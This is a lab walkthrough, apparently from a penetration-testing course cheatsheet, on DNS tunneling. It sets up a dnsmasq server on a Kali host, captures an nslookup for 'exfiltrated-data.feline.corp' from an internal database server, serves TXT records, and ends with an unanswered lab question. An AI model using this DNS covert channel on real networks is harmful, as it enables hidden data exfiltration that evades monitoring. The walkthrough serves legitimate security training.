# DNS Tunneling Fundamentals

The high-level DNS request flow, with MULTISERVER03 configured as the DNS resolver
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DNS-Tunneling-Fundamentals-1.png)

The network layout for our DNS experiments
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DNS-Tunneling-Fundamentals-2.png)

The basic configuration for our Dnsmasq server
>``` shell
>kali@felineauthority:~$ cd dns_tunneling
>
>kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
>
># ========== Expected Result ==========
># Do not read /etc/resolv.conf or /etc/hosts
>no-resolv
>no-hosts
>
># Define the zone
>auth-zone=feline.corp
>auth-server=feline.corp
># =====================================
>```

Starting Dnsmasq with the basic configuration
>``` shell
>kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
>
># ========== Expected Result ==========
>dnsmasq: started, version 2.88 cachesize 150
>dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
>dnsmasq: warning: no upstream servers configured
>dnsmasq: cleared cache
># =====================================
>```

Starting tcpdump on FELINEAUTHORITY
>``` shell
>kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
>
># ========== Expected Result ==========
>[sudo] password for kali: 
>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
>listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
># =====================================
>```

Checking the configured DNS server on PGDATABASE01
>``` shell
>database_admin@pgdatabase01:~$ resolvectl status
>
># ========== Expected Result ==========
>...             
>
>Link 5 (ens224)
>      Current Scopes: DNS        
>DefaultRoute setting: yes        
>       LLMNR setting: yes        
>MulticastDNS setting: no         
>  DNSOverTLS setting: no         
>      DNSSEC setting: no         
>    DNSSEC supported: no         
>  Current DNS Server: 10.4.50.64
>         DNS Servers: 10.4.50.64
>
>Link 4 (ens192)
>      Current Scopes: DNS        
>DefaultRoute setting: yes        
>       LLMNR setting: yes        
>MulticastDNS setting: no         
>  DNSOverTLS setting: no         
>      DNSSEC setting: no         
>    DNSSEC supported: no         
>  Current DNS Server: 10.4.50.64
>         DNS Servers: 10.4.50.64
># =====================================
>```

Using nslookup to make a DNS request for exfiltrated-data.feline.corp
>``` shell
>database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
>
># ========== Expected Result ==========
>Server:		127.0.0.53
>Address:	127.0.0.53#53
>
>** server can't find exfiltrated-data.feline.corp: NXDOMAIN
># =====================================
>```

DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03
>``` shell
>kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
>
># ========== Expected Result ==========
>[sudo] password for kali: 
>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
>listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
>04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)
>04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1 (57)
># =====================================
>```

The request flow after issuing an nslookup for exfiltrated-data.feline.corp
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/DNS-Tunneling-Fundamentals-3.png)

Checking the TXT configuration file then starting Dnsmasq with it
>``` shell
>kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
>
># ========== Expected Result ==========
># Do not read /etc/resolv.conf or /etc/hosts
>no-resolv
>no-hosts
>
># Define the zone
>auth-zone=feline.corp
>auth-server=feline.corp
>
># TXT record
>txt-record=www.feline.corp,here's something useful!
>txt-record=www.feline.corp,here's something else less useful.
># =====================================
>
>kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
>
># ========== Expected Result ==========
>dnsmasq: started, version 2.88 cachesize 150
>dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
>dnsmasq: warning: no upstream servers configured
>dnsmasq: cleared cache
># =====================================
>```

The TXT record response from www.feline.corp
>``` shell
>database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
>
># ========== Expected Result ==========
>Server:		192.168.50.64
>Address:	192.168.50.64#53
>
>Non-authoritative answer:
>www.feline.corp	text = "here's something useful!"
>www.feline.corp	text = "here's something else less useful."
>
>Authoritative answers can be found from:
># =====================================
>```

Lab 1 - Follow the steps in this section. From CONFLUENCE01 or PGDATABASE01, make a TXT record request for give-me.cat-facts.internal, using MULTISERVER03 as the DNS resolver. What's the value of the TXT record?
>``` shell
>
>```
>
